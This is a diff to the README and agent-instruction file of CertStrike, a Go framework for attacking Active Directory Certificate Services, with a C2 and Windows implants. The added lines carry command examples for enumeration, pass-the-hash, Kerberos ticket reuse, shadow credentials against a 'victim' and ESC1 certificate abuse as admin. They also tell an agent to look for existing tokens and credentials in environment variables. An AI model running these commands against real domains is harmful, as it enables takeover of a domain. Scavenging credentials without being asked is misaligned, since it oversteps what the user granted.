@@ -1,5 +1,18 @@
 # CertStrike
 
+## Verification Protocol
+When I say 'verify' or 'run a loop', systematically: 1) Build the project first, 2) Test each feature end-to-end, 3) Only claim 'done' after actual verification with evidence. NEVER claim something works without running it.
+
+## Environment
+- Primary language: Go. Ensure `go` is on PATH before starting work.
+- Always check for existing tokens/credentials in environment variables before asking the user.
+- Build ALL targets in Makefile, not a subset.
+
+## Communication Rules
+- Do NOT speculate about causes (VPN, routing, etc.) — investigate actual code first.
+- Do NOT add licenses, co-author attributions, or other metadata without explicit permission.
+- When asked to make a simple change, make the change immediately. Do not explore the codebase first.
+
 ## Overview
 ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.
 
@@ -63,6 +76,8 @@ cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 - Auto-detect best technique based on running services
 
 ### Operational
+- Kerberos authentication (`-k`) with ccache (`--ccache` / `KRB5CCNAME`), keytab (`--keytab`), or password-based TGT
+- GSSAPI bind for LDAP, SPNEGO for HTTP enrollment, Kerberos AP-REQ for SMB2/RPC enrollment
 - LDAPS (`--ldaps`) and StartTLS (`--start-tls`) support
 - NTLM pass-the-hash for LDAP bind (`--hash`)
 - JSON structured output (`--json`)
@@ -80,6 +95,13 @@ certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass --lda
 certstrike pki --enum --target-dc dc01 --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
 certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass --json
 certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass --stealth
+
+# Kerberos authentication (ccache from impacket, keytab, or password TGT)
+certstrike pki --enum --target-dc dc01 --domain corp.local -u user -k --ccache user.ccache
+KRB5CCNAME=user.ccache certstrike pki --enum --target-dc dc01 --domain corp.local -u user -k
+certstrike pki --enum --target-dc dc01 --domain corp.local -u user -k --keytab user.keytab
+certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass -k  # password-based TGT
+certstrike shadow --add --target victim -k --ccache user.ccache --target-dc dc01 --domain corp.local -u user
 
 # Exploit (--esc accepts 1-14)
 certstrike pki --esc 1 --template Vuln --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
@@ -118,7 +140,8 @@ certstrike mcp
 ## Dependencies
 All pure Go, CGO_ENABLED=0 compatible:
 - `github.com/spf13/cobra` — CLI framework
-- `github.com/go-ldap/ldap/v3` — Native LDAP client
+- `github.com/go-ldap/ldap/v3` — Native LDAP client (includes GSSAPI bind support)
+- `github.com/jcmturner/gokrb5/v8` — Pure Go Kerberos 5 (ccache, keytab, SPNEGO, GSSAPI)
 - `github.com/charmbracelet/bubbletea` — TUI framework
 - `github.com/charmbracelet/lipgloss` — TUI styling
 - `software.sslmate.com/src/go-pkcs12` — PKCS12/PFX handling
